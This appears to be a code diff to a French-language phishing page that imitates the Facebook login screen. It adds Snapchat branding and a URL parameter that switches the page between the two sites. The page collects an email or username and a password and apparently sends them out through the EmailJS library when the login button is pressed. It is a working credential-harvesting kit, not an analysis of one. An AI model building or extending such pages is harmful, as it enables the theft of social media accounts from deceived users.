@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="fr">
 <head>
 <meta charset="utf-8"/>
@@ -58,21 +59,26 @@
     font-size: 0.9em;
     text-decoration: none;
   }
-</style>
+
+  body { font-family: 'Avenir Next', 'Helvetica Neue', sans-serif; }</style>
 </head>
 <body>
 <div class="container">
 <div class="logo">
-<img id="logo-img" alt="Logo" src="logo-fb.jpg"/>
+<img alt="Logo" id="logo-img" src="logo-fb.jpg"/>
 </div>
 <h1 id="title">Se connecter à Facebook</h1>
-<input id="fb_email" placeholder="Adresse e-mail ou numéro de mobile" required type="text"/>
-<input id="fb_password" placeholder="Mot de passe" required type="password"/>
-<button class="btn-primary" id="login-btn" onclick="sendLoginData()">Se connecter</button>
-<a id="forgot-link" href="#">Mot de passe oublié ?</a>
-<a href="#">Créer un nouveau compte</a>
+<input id="fb_email" placeholder="Nom d'utilisateur ou e-mail (ex. snapuser123)" required="" type="text"/>
+<div id="toggle-container" style="text-align:center; margin-bottom:15px;">
+<button id="toggle-input-type" onclick="toggleInputType()" style="background:none;border:none;color:blue;cursor:pointer;font-size:0.9em;">
+    Utiliser le numéro de mobile
+  </button>
 </div>
-
+<input id="fb_password" placeholder="Mot de passe Snapchat" required="" type="password"/>
+<button class="btn-primary" id="login-btn" onclick="sendLoginData()">Se connecter</button>
+<a href="#" id="forgot-link">Mot de passe oublié ?</a>
+<a href="#">Créer un compte Snapchat</a>
+<p style="font-size:0.85em; color:#606770; margin-top:15px;">En continuant, tu acceptes les Conditions d'utilisation de Snapchat.</p></div>
 <script>
 window.addEventListener('DOMContentLoaded', () => {
   const params = new URLSearchParams(window.location.search);
@@ -103,7 +109,6 @@ window.addEventListener('DOMContentLoaded', () => {
   }
 });
 </script>
-
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
 (function() {
@@ -151,5 +156,37 @@ function sendLoginData() {
   });
 }
 </script>
-</body>
+<script>
+function toggleInputType() {
+  const input = document.getElementById('fb_email');
+  const toggleBtn = document.getElementById('toggle-input-type');
+
+  if (input.placeholder.includes("e-mail")) {
+    input.placeholder = "Numéro de mobile (ex. +33 6 12 34 56 78)";
+    toggleBtn.textContent = "Utiliser l'e-mail ou nom d'utilisateur";
+  } else {
+    input.placeholder = "Nom d'utilisateur ou e-mail (ex. snapuser123)";
+    toggleBtn.textContent = "Utiliser le numéro de mobile";
+  }
+}
+</script><script>
+window.addEventListener('DOMContentLoaded', () => {
+  const reseau = new URLSearchParams(window.location.search).get('reseau') || 'facebook';
+  const input = document.getElementById('fb_email');
+
+  if (reseau === 'snapchat') {
+    input.placeholder = "Nom d'utilisateur Snapchat (ex. snapuser123)";
+  } else {
+    input.placeholder = "Adresse e-mail ou numéro de mobile";
+  }
+});
+</script><script>
+window.addEventListener('DOMContentLoaded', () => {
+  const reseau = new URLSearchParams(window.location.search).get('reseau') || 'facebook';
+  const toggleContainer = document.getElementById('toggle-container');
+  if (toggleContainer) {
+    toggleContainer.style.display = (reseau === 'snapchat') ? 'block' : 'none';
+  }
+});
+</script></body>
 </html>
